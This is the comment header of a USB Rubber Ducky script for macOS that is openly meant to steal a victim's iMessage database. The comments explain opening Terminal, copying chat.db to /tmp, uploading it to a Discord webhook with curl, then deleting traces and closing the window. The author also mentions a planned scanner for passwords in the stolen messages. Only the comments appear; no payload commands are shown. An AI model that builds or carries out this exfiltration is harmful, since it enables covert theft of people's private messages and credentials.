REM DUCKY MAC CHAT.DB EXFILTRATION VIA DISCORD WEBHOOK
REM For Mac OS 
REM CREATED BY ECTO-1A


REM This script assumes that you have the "curl" command installed on your Mac. 
REM You will need to replace <webhook URL> with the URL of the Discord webhook you want to use.
REM Discord max webook file size is 8mb so this will only work with smaller chat.db files


REM This script will open the terminal, navigate to the directory where the chat.db file is stored, 
REM copy the file to the tmp directory, use curl to send the file to the Discord webhook, 
REM delete the copy of the file from the tmp directory, and then close the terminal.
REM the chat.db is a database of all text messages sent via iMessage if set up on their computer.

REM I'm currently working on a python script to scan the chat.db for any potential passwords or other sensitive data.
REM Should hopefully be ready by early 2023
